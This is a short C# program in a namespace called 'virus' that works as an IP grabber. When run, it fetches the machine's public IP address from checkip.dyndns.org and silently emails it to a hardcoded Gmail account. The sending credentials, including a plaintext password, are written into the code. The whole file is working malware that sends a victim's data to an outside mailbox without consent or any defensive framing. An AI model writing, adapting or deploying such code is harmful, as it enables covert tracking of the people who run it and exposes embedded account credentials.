using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;

namespace virus
{
    class Program
    {
        static string GetIPAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            var smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential("ipgrabber1245@gmail.com", "fFqzZy4xriUqmBG@123"),
                EnableSsl = true,
            };

            smtpClient.Send("ipgrabber1245@gmail.com", "ipgrabber1245@gmail.com", "ip", address);
            return address;
        }

        static void Main(string[] args)
        {
            _ = GetIPAddress();
        }
    }
}
